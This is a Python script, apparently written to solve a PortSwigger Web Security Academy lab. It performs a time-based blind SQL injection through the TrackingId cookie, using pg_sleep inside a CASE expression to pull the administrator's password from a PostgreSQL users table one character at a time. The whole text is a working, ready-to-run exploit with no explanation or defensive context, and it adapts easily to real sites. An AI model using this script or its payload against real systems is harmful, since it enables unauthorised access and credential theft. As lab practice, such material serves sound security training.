import requests

# Target URL
url = 'https://0a72004e03d4e29b81937fb600af00a9.web-security-academy.net/filter?category=Tech+gifts'

# Expanded character set
characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+"

# Cookie values (Modify if needed)
base_cookie = {
    'TrackingId': '71sPCf8d37ESUNjX',
    'session': 'OK1BWmrDQSZQG0AMHzrxl9nIUrsz3MDN'
}

def send_request(payload):
    """ Sends an HTTP request with the given SQL payload """
    try:
        cookie = base_cookie.copy()
        cookie['TrackingId'] = f"{cookie['TrackingId']}{payload}"  # Proper concatenation
        r = requests.get(url, cookies=cookie, timeout=5)
        return r.elapsed.total_seconds() > 2  # True if sleep is triggered
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

def get_data(length):
    """ Retrieves password using a time-based SQL injection attack """
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            payload = f"' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator') FROM {i} FOR 1) = '{char}' THEN pg_sleep(2) ELSE pg_sleep(0) END) -- "
            if send_request(payload):
                temp += char
                print(f"Extracted so far: {temp}")
                break  # Move to the next character
    return temp

print("Dumping data... please be patient!")
data = get_data(20)
print(f"Got it! Password: {data}")
